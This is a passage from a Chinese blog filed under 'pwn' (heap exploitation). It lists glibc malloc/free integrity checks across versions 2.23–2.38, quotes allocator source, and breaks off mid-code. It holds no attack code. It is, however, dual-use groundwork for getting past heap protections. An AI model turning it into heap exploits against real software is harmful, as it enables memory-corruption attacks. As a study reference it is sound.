id="malloc-7"><a href="#malloc-7" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-7"><a href="#libc-malloc-7" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p>无显著变化</p><h3 id="int-malloc-7"><a href="#int-malloc-7" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><p>无显著变化</p><h2 id="free-7"><a href="#free-7" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-7"><a href="#libc-free-7" class="headerlink" title="__libc_free"></a>__libc_free</h3><p>无显著变化</p><h3 id="int-free-7"><a href="#int-free-7" class="headerlink" title="__int_free"></a>__int_free</h3><p>无显著变化</p><h2 id="附属-7"><a href="#附属-7" class="headerlink" title="附属"></a>附属</h2><p>无显著变化</p><h1 id="glibc2-37"><a href="#glibc2-37" class="headerlink" title="glibc2.37"></a>glibc2.37</h1><h2 id="malloc-8"><a href="#malloc-8" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-8"><a href="#libc-malloc-8" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p>无显著变化</p><h3 id="int-malloc-8"><a href="#int-malloc-8" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><p>无显著变化</p><h2 id="free-8"><a href="#free-8" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-8"><a href="#libc-free-8" class="headerlink" title="__libc_free"></a>__libc_free</h3><p>无显著变化</p><h3 id="int-free-8"><a href="#int-free-8" class="headerlink" title="__int_free"></a>__int_free</h3><p>无显著变化</p><h2 id="附属-8"><a href="#附属-8" class="headerlink" title="附属"></a>附属</h2><p>无显著变化</p><h1 id="glibc2-38"><a href="#glibc2-38" class="headerlink" title="glibc2.38"></a>glibc2.38</h1><h2 id="malloc-9"><a href="#malloc-9" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-9"><a href="#libc-malloc-9" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p>无显著变化</p><h3 id="int-malloc-9"><a href="#int-malloc-9" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><p>无显著变化</p><h2 id="free-9"><a href="#free-9" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-9"><a href="#libc-free-9" class="headerlink" title="__libc_free"></a>__libc_free</h3><p>无显著变化</p><h3 id="int-free-9"><a href="#int-free-9" class="headerlink" title="__int_free"></a>__int_free</h3><p>无显著变化</p><h2 id="附属-9"><a href="#附属-9" class="headerlink" title="附属"></a>附属</h2><h3 id="tcache-7"><a href="#tcache-7" class="headerlink" title="tcache"></a>tcache</h3><h4 id="tcache-get-3"><a href="#tcache-get-3" class="headerlink" title="tcache_get"></a>tcache_get</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get_n (tc_idx, &amp; tcache-&gt;entries[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tcache变为调用tcache_get_n (tc_idx, &amp; tcache-&gt;entries[tc_idx])</p><p>tcache_get_n的实现如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get_n</span> <span class="params">(<span class="type">size_t</span> tc_idx, tcache_entry **ep)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e;</span><br><span class="line">  <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))</span><br><span class="line">    e = *ep;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    e = REVEAL_PTR (*ep);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))</span><br><span class="line">      *ep = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *ep = PROTECT_PTR (ep, REVEAL_PTR (e-&gt;next));</span><br><span class="line"></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的变化使得tcache可以从链中间取出chunk</p><p>不过对于tcache_get来说,实际上并没有什么变化</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> glibc </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>malloc/free安全检查</title>
      <link href="/posts/25293/"/>
      <url>/posts/25293/</url>
      
        <content type="html"><![CDATA[<span class='p black'>在不同的glibc下</span><p>分为两篇,一篇记录安全检测,一篇记录操作变化</p><p><strong>需要注意,一个大版本下的libc还有许多小版本,版本不同libc也会存在差异,可能有些有检查有些没有</strong></p><p>这里以<a href="http://mirrors.nju.edu.cn/gnu/libc/">libc下载</a>网站下载的为准</p><p><strong>有些检查可能是在介绍的两个版本之间更新的,这里以只考虑比较经典的几个版本</strong></p><h1 id="glibc2-23"><a href="#glibc2-23" class="headerlink" title="glibc2.23"></a>glibc2.23</h1><p><strong>现在看来,2.23已经是一个比较老的版本了,比它更早的版本暂时不做关注,2.23是一个十分经典的版本,以它为基础先概览各类检查</strong></p><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">        ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br></pre></td></tr></table></figure><p>返回victim前的最后一个检查,需要满足以下三个条件中的至少一个:</p><ol><li>victim==NULL</li><li>chunk的mmap分配标志位为1</li><li>chunk的non_main_arena标志为0</li></ol><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><h4 id="mglobal-1"><a href="#mglobal-1" class="headerlink" title="mglobal-1"></a>mglobal-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                             \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;      \</span></span><br><span class="line"><span class="meta">      __set_errno (ENOMEM);      \</span></span><br><span class="line"><span class="meta">      return 0;      \</span></span><br><span class="line"><span class="meta">    &#125;      \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (req) &gt;=      \</span></span><br><span class="line"><span class="meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span></span><br></pre></td></tr></table></figure><p>_int_malloc初始会在checked_request2size (bytes, nb)中判断申请大小是否合规</p><p>如果在无符号比较中申请大小大于等于-2* MINSIZE,则会报错</p><blockquote><p>另外提一下,虽然在代码中是先判断申请大小是否越界,再将其转为实际申请chunk大小,但在大多数实际情况下,二者的顺序是倒过来的,即先转化再判断</p></blockquote><h4 id="mfastbin-1"><a href="#mfastbin-1" class="headerlink" title="mfastbin-1"></a>mfastbin-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>取出fastbin中的chunk时,通过该chunk计算出的fastbin索引是否与该chunk所在的链的索引相同,即大小是否对应</p><h4 id="msmallbin-1"><a href="#msmallbin-1" class="headerlink" title="msmallbin-1"></a>msmallbin-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">             bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">               &#123;</span><br><span class="line">                 errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                 <span class="keyword">goto</span> errout;</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure><p>取出smallbin中的chunk时,判断链表的完整性</p><h4 id="munsortedbin-1"><a href="#munsortedbin-1" class="headerlink" title="munsortedbin-1"></a>munsortedbin-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                   chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p>unsorted循环遍历时,检查从unsortedbin中取出的chunk的size是否合规</p><h4 id="munsorted-2"><a href="#munsorted-2" class="headerlink" title="munsorted-2"></a>munsorted-2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>将unsortedbin中取出的chunk放入不为空的largebin中时,largebin链中的最后一个chunk的NON_MAIN_ARENA标志位应该为0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>将unsortedbin中取出的chunk放入不为空的largebin中时,chunk的size大于等于最小的size</p><p>会对每一个位于nextsize链上大于它的chunk调用检查</p><h4 id="mlargebin-1"><a href="#mlargebin-1" class="headerlink" title="mlargebin-1"></a>mlargebin-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br></pre></td></tr></table></figure><p>largebin中取出chunk需要切割时,会检查unsorted头部的完整性</p><h4 id="mbinmap-1"><a href="#mbinmap-1" class="headerlink" title="mbinmap-1"></a>mbinmap-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br></pre></td></tr></table></figure><p>与<strong>largebin-1</strong>相同,位于binmap分配中</p><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><h3 id="int-free"><a href="#int-free" class="headerlink" title="__int_free"></a>__int_free</h3><h4 id="fglobal-1"><a href="#fglobal-1" class="headerlink" title="fglobal-1"></a>fglobal-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">      (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ol><li>通过无符号数比较p是否大于-size,判断p是否正常</li><li>判断p是否对齐</li></ol><h4 id="fglobal-2"><a href="#fglobal-2" class="headerlink" title="fglobal-2"></a>fglobal-2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>size是否小于MINSIZE或者size不对齐</p><h4 id="ffastbin-1"><a href="#ffastbin-1" class="headerlink" title="ffastbin-1"></a>ffastbin-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>判断p的下一个chunk的size是否正常</p><h4 id="ffastbin-2"><a href="#ffastbin-2" class="headerlink" title="ffastbin-2"></a>ffastbin-2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果p等于该fastbin链上的第一个chunk,那么判定为double free</p><h4 id="ffastbin-3"><a href="#ffastbin-3" class="headerlink" title="ffastbin-3"></a>ffastbin-3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>比较少见的一个检查</p><h4 id="fglobal-2-1"><a href="#fglobal-2-1" class="headerlink" title="fglobal-2"></a>fglobal-2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>如果p为top_chunk,判定为double free</p><h4 id="fglobal-3"><a href="#fglobal-3" class="headerlink" title="fglobal-3"></a>fglobal-3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>判断p的nextchunk是否超越了堆的边界</p><h4 id="fglobal-4"><a href="#fglobal-4" class="headerlink" title="fglobal-4"></a>fglobal-4</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>判断p的nextchunk的prev_inuse位是否为1,不为1则报错</p><h4 id="fglobal-5"><a href="#fglobal-5" class="headerlink" title="fglobal-5"></a>fglobal-5</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   nextsize = chunksize(nextchunk);</span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>判断p的nextchunk的size是否正常</p><h4 id="fglobal-6"><a href="#fglobal-6" class="headerlink" title="fglobal-6"></a>fglobal-6</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>放入unsortedbin时,判断unsorted的头部完整性</p><h2 id="附属"><a href="#附属" class="headerlink" title="附属"></a>附属</h2><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><h4 id="unlink-1"><a href="#unlink-1" class="headerlink" title="unlink-1"></a><strong>unlink-1</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure><p>验证完整性,操作chunk的上一个的下一个和下一个的上一个是否都等于该chunk</p><h4 id="unlink-2"><a href="#unlink-2" class="headerlink" title="unlink-2"></a>unlink-2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      \</span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">     malloc_printerr (check_action,      \</span><br><span class="line">       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">       P, AV);</span><br></pre></td></tr></table></figure><p>和unlink-1类似,不过检查的是largebin的nextsize链完整性</p><h1 id="glibc2-27"><a href="#glibc2-27" class="headerlink" title="glibc2.27"></a>glibc2.27</h1><h2 id="附属-1"><a href="#附属-1" class="headerlink" title="附属"></a>附属</h2><h3 id="unlink-1"><a href="#unlink-1" class="headerlink" title="unlink"></a>unlink</h3><h4 id="unlink-3"><a href="#unlink-3" class="headerlink" title="+unlink-3"></a><strong>+unlink-3</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>); </span><br></pre></td></tr></table></figure><p>检查通过该chunk的size找到的nextchunk的prev_size是否等于该chunk的size,</p><p>unlink不会检查通过prev_size找到的chunk的size是否等于那个prev_size</p><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h3><h4 id="maco-1"><a href="#maco-1" class="headerlink" title="+maco-1"></a>+maco-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断由p的size计算得出的fastbin索引是否与当前fastbin链匹配</p><h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><h4 id="tcput-1"><a href="#tcput-1" class="headerlink" title="+tcput-1"></a>+tcput-1</h4><p><code>assert (tc_idx &lt; TCACHE_MAX_BINS);</code></p><p>判断tc_idx是否越界</p><h4 id="tcget-1"><a href="#tcget-1" class="headerlink" title="+tcget-1"></a>+tcget-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>判断tc_idx是否越界以及该tcache链是否为空</p><h1 id="glibc2-29"><a href="#glibc2-29" class="headerlink" title="glibc2.29"></a>glibc2.29</h1><h2 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h2><h3 id="munsortedbin-1-1"><a href="#munsortedbin-1-1" class="headerlink" title="@munsortedbin-1"></a>@munsortedbin-1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure><p>除了之前就存在的对victim的size检查外,新增:</p><ol><li>对nextchunk(victim的物理相邻chunk)的size的检查</li><li>判断该chunk的size是否等于nextchunk的prev_size</li><li>判断链表尾部的完整性</li><li>对victim的nextchunk的prev_inuse位检查,是否合理</li></ol><h3 id="munsortedbin-2"><a href="#munsortedbin-2" class="headerlink" title="+munsortedbin-2"></a>+munsortedbin-2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br></pre></td></tr></table></figure><p>移除unsorted中chunk时检查链表尾是否完整</p><h3 id="usetop-1"><a href="#usetop-1" class="headerlink" title="+usetop-1"></a>+usetop-1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br></pre></td></tr></table></figure><p>检查topchunk的size是否合规</p><h2 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h2><h3 id="ftcache-1"><a href="#ftcache-1" class="headerlink" title="+ftcache-1"></a>+ftcache-1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, 